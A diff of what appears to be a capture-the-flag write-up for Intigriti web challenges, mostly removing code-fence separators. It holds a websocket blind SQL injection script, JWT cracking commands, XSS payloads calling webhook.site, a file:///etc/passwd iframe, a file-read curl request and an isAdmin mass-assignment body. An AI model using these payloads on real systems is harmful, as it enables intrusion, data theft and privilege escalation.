@@ -6,29 +6,9 @@
 
 ```
 1
-```
-
-
-
-```
 1 OR 1=1
-```
-
-
-
-```
 1
-```
-
-
-
-```
 1 AND 1=2
-```
-
-
-
-```
 1
 2
 3
@@ -54,15 +34,10 @@
 23
 24
 25
-```
-
-
-
-```
 import string, base64
 from websockets.sync.client import connect
 
-def sqli(ws,q_left,chars):	
+def sqli(ws,q_left,chars):
  data = """{"id":"11 and (%s='%s')"}""" % (q_left, chars)
  ws.send(data)
  temp = ws.recv()
@@ -80,71 +55,26 @@ def exploit_websockets(TARGET):
  print(dumped)
  i+=1
  break
- 
+
 if __name__ == "__main__":
  TARGET = "wss://bountyrepo.ctf.intigriti.io/ws"
  exploit_websockets(TARGET)
-```
-
-
-
-```
 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZGVudGl0eSI6ImNyeXB0MCJ9.zbwLInZCdG8Le5iH1fb5GHB5OM4bYOm8d5gZ2AbEu_I
-```
-
-
-
-```
 # jwt2john
 ./jwt2john.py "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZGVudGl0eSI6ImNyeXB0MCJ9.zbwLInZCdG8Le5iH1fb5GHB5OM4bYOm8d5gZ2AbEu_I" > hash
 
 # john
 john hash --wordlist=/usr/share/wordlists/rockyou.txt
-```
-
-
-
-```
 1
 2
 3
-```
-
-
-
-```
 {
  "firstName":"<h1>firstName</h1>","lastName":"<h1>lastName</h1>","spotifyTrackCode":"<h1>spotifyTrackCode</h1>"
 }
-```
-
-
-
-```
 1
-```
 
-
-
-```
-<img src=x onerror=fetch('https://webhook.site/edf38419-6f01-4b60-aa0e-2428b2089bef') />
-```
-
-
-
-```
 1
-```
 
-
-
-```
-<iframe src=file:///etc/passwd height=2000 width=800></iframe>
-```
-
-
-
-```
 1
 2
 3
@@ -159,15 +89,10 @@ john hash --wordlist=/usr/share/wordlists/rockyou.txt
 12
 13
 14
-```
-
-
-
-```
-/app/app.js 
+/app/app.js
 /app/package.json
-/app/routes/index.js 
-/app/routes/api.js 
+/app/routes/index.js
+/app/routes/api.js
 /app/views/register.handlebars
 /app/services/user.js
 /app/middleware/check_admin.js
@@ -176,29 +101,14 @@ john hash --wordlist=/usr/share/wordlists/rockyou.txt
 /app/utils/generateProfileCard.js
 /app/views/print_profile.handlebars
 /app/data/{hash}.json
-/app/Dockerfile 
+/app/Dockerfile
 /etc/resolv.conf
-```
-
-
-
-```
 1
 2
 3
-```
-
-
-
-```
 router.get('/admin', isAdmin, (req, res) => {
  res.render('admin', { flag: process.env.FLAG || 'CTF{DUMMY}' })
 })
-```
-
-
-
-```
 1
 2
 3
@@ -223,11 +133,6 @@ router.get('/admin', isAdmin, (req, res) => {
 22
 23
 24
-```
-
-
-
-```
 const { getUser, userExists } = require('../services/user')
 const isAdmin = (req, res, next) => {
 let loginHash = req.cookies['login_hash']
@@ -252,11 +157,6 @@ next()
 }
 
 module.exports = { isAdmin }
-```
-
-
-
-```
 1
 2
 3
@@ -304,11 +204,6 @@ module.exports = { isAdmin }
 45
 46
 47
-```
-
-
-
-```
 const fs = require('fs')
 const path = require('path')
 const { createHash } = require('crypto')
@@ -356,11 +251,6 @@ const getUser = (loginHash) => {
 const userExists = (loginHash) => {
  return fs.existsSync(path.join(dataDir, `${path.basename(loginHash)}.json`))
 }
-```
-
-
-
-```
 1
 2
 3
@@ -385,11 +275,6 @@ const userExists = (loginHash) => {
 22
 23
 24
-```
-
-
-
-```
 ...
 // Create User only accepts username, firstName, lastName
 // There is no isAdmin available in here
@@ -414,33 +299,18 @@ const userData = {
 try {
  setUserData(req.loginHash, userData)
 ...
-```
-
-
-
-```
 1
 2
 3
 4
 5
 6
-```
-
-
-
-```
 // We can send userOptions in the body
 router.post('/profile/generate-profile-card', requireAuth, async (req, res) => {
  const pdf = await generatePDF(req.userData, req.body.userOptions)
  res.contentType('application/pdf')
  res.send(pdf)
 })
-```
-
-
-
-```
 1
 2
 3
@@ -460,11 +330,6 @@ router.post('/profile/generate-profile-card', requireAuth, async (req, res) => {
 17
 18
 19
-```
-
-
-
-```
 ...
 const generatePDF = async (userData, userOptions) => {
  const browser = await puppeteer.launch({
@@ -484,42 +349,12 @@ const generatePDF = async (userData, userOptions) => {
  ...
 }
 ...
-```
-
-
-
-```
 1
-```
-
-
-
-```
 curl -k -X POST -H 'Content-Type: application/json' -b 'login_hash=f024b76b41f9dba21cf620484862e9b90465d8db09ea946fb04a0f6f3876103a' https://mymusic.ctf.intigriti.io/profile/generate-profile-card -d '{"userOptions":{"path":"/app/data/test.json"}}'
-```
-
-
-
-```
 1
-```
-
-
-
-```
 {'username':'a','firstName':'a','lastName':'b','spotifyTrackCode':'c','isAdmin':'true'}
-```
-
-
-
-```
 1
-```
 
-
-
-```
-<img src=x onerror=document.location='https://webhook.site/edf38419-6f01-4b60-aa0e-2428b2089bef'>
 ```
 
 
